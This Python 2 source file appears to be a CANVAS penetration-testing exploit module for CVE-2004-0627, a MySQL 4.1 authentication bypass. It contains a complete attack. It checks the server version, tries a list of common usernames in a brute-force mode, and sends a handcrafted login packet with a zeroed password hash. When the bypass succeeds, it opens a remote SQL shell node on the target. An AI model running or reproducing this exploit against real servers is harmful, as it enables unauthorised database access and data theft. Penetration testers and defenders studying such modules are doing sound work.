#! /usr/bin/env python
"""
Error Notes:

    Null Packet Received: It looks like sometimes when authentication failed, instead of receiving
     an error packet, it receive a null packet.

    Bad Handshake: I couln't reproduce it on my testing environment, but looks like a connection
     problem on authentication time.

"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

VERSION="1.0"

CHANGES="""
1.0 released.
"""


NOTES="""
Mysql authentication can be bypass by a special crafted password with zeroed-strings password. Note
that the version 4.1.3 should really be treated as 4.1.03 and can be misleading when testing against
a server that has a version number of say 4.1.20. 
"""


DOCUMENTATION={}
DOCUMENTATION["Date public"]="07/2004"
#DOCUMENTATION["CERT Advisory"]=""
DOCUMENTATION["OSVDB"]="http://www.osvdb.org/displayvuln.php?osvdb_id=7475"
DOCUMENTATION["CVE Name"] = "CVE-2004-0627"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0627"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION["Notes"]=NOTES
NAME="MySQL authentication bypass"
DESCRIPTION="Authentication bypass with zeroed-string password"

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"], ["Linux"], ["Solaris"], ["FreeBSD"] ]

GTK2_DIALOG="dialog.glade2"

import os,getopt,stat
import sys,struct
from StringIO import StringIO

sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../MOSDEF")
sys.path.append("./MOSDEF")
sys.path.append("./libs")
sys.path.append("../../libs")
sys.path.append("../../gui")
sys.path.append("./gui")

        
import socket
from exploitutils import *
import time
from tcpexploit import tcpexploit
import mysqllib
import canvasengine
import linuxshell
from sqllistener import mysqllistener
from SQLNode import SQLNode
from SQLShellServer import mysqlshellserver

runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit

"""
FC2 comes with version 3.23.58-9
"""

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name=NAME
        self.setPort(3306)
        self.setHost("")
        self.setVersion(1)
        self.badstring=""
        self.db=""
        self.user=""
        # You are invited to add more users here (for bruteforce mode):
        self.users = ['root', 'mysql', 'mysqld', 'nobody', 'www', 'apache', 'httpd', 'db']
        self.ssl=0
        return

    def setHost(self, target):
        self.host=target
            
    def setISucceeded(self, func):
        self.ISucceeded=func
                    
    def createShellcode(self, d="", b=""):
        return ""

    def test(self):
        """
        Tests for vulns's presence. Prints out the version if
        found.
        """
        # This would be improved
        host = self.target.interface
        port = self.argsDict.get("port",self.port)

        try:
            m=mysqllib.MySQL()
            m.connect( (host, port))      
            version=m.getServerVersion()
            self.log('MySQL version: %s' % version)
            m.close()

            if version[0:3] == "4.1":
                return 1
        except Exception, ex:
            self.log('Error: %s' % ex)
        return 0

    def setSSL(self,ssl):
        self.ssl=ssl
        return

    def neededListenerTypes(self):
        return []

    def run(self):
        self.host = self.target.interface
        self.port = self.argsDict.get("port",self.port)
        self.user = self.argsDict.get("user",self.user)
        self.ssl =  self.argsDict.get("ssl",self.ssl)
        self.db  =  self.argsDict.get("db",self.db)
        self.socknode=self.argsDict["passednodes"][0]
        self.setInfo("%s attacking %s:%d (in progress)" % (NAME,self.host, self.port), showlog=1)
        ret=0
        error=""
        if not self.ssl: # No Bruteforce
            self.users= [self.user]
	
	if self.test():
	    for a in self.users:
		self.log("Trying to connect with username: %s" % a)
		try:
		    self.m=mysqllib.MySQL()
		    self.m.connect( (self.host, self.port))      
		    self.fakeauthenticate(a)
		except mysqllib.error, msg:
		    error=msg
		    self.m.close()
		    continue
		self.setInfo("%s attacking %s:%d (success)" % (NAME,self.host, self.port), showlog=1)            
		node = SQLNode()
		node.parentnode = self.socknode
		shell = mysqlshellserver(self.m, node, logfunction=self.logfunction)
		shell.startup()
		node.startup()
		return node
	else:
	    self.log("Failed: MySQL version not vulnerable.")
	    self.setInfo("%s attacking %s:%d (failed)" % (NAME,self.host, self.port), showlog=1)
	    return 0
        
        self.log("Failed: " + str(error))
        self.setInfo("%s attacking %s:%d (failed)" % (NAME,self.host, self.port), showlog=1)
        return 0
        
    def fakeauthenticate(self, user):
        flag=0
                                                                                
        if self.db:
            flag|=mysqllib.CLIENT_CONNECT_WITH_DB
                                                                                
        flag|=mysqllib.CLIENT_LONG_FLAG
        flag|=mysqllib.CLIENT_INTERACTIVE   | mysqllib.CLIENT_LOCAL_FILES
        flag|=mysqllib.CLIENT_LONG_PASSWORD | mysqllib.CLIENT_SECURE_CONNECTION
        flag|=mysqllib.CLIENT_SECURE_CONNECTION
        
        buf  = struct.pack("H", flag)
        buf += mysqllib.pack_uint3(mysqllib.MAX_PACKETSIZE)
                                                                                
        buf+=user+"\0"                                                                                        
        buf+=chr(0x14) +"\0"*0x14
                                                                                
        buf+=self.db + "\0"
	buf = "\x85\xa6"+"\x03\x00\x00" + "\x00" +\
              "\x00\x01\x08\x00\x00\x00"+\
              "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+ user +"\x00\x14\x00\x00\x00\x00"+\
             "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"; # continue NULL hash

        buf= mysqllib.pack_uint3(len(buf)) + '\x01' + buf
        
        self.m._s.send(buf)
        return self.m.recv_packet()

    def setBruteForce(self):
        self.ssl=1

    def usage(self):
        print "Usage: %s -t target -p port:21 -U username [-m database -b bruteforce -T test]" % sys.argv[0]    

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
